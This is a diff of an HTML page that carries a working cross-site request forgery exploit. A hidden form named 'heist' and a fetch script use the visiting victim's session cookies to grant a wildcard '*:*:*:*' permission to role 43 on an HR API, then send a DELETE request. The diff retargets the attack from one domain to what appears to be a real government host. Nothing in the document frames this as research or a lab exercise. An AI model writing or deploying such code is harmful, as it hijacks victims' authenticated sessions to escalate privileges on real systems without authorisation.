@@ -23,7 +23,7 @@
       <h1>.......</h1><h1>Test</h1>
     </div>
 
-    <form id="heist" method="POST" action="https://hr.moi-sy.com/api/permission" style="display: none">
+    <form id="heist" method="POST" action="https://hr.moia.gov.sy/api/permission" style="display: none">
       <input name="role_id" value="43" />
       <input name="code" value="*:*:*:*" />
     </form>
@@ -32,7 +32,7 @@
       async function addPrivilegeThenRemove() {
         try {
           // 1) Send the POST request
-          const postResponse = await fetch("https://hr.moi-sy.com/api/permission", {
+          const postResponse = await fetch("https://hr.moia.gov.sy/api/permission", {
             method: "POST",
             body: new FormData(document.getElementById("heist")),
             credentials: "include",
@@ -47,7 +47,7 @@
           console.log("POST successful");
 
           // 2) Now send the DELETE
-          const deleteResponse = await fetch("https://hr.moi-sy.com/api/permission/1/*:*:*:*", {
+          const deleteResponse = await fetch("https://hr.moia.gov.sy/api/permission/1/*:*:*:*", {
             method: "DELETE",
             credentials: "include",
           });
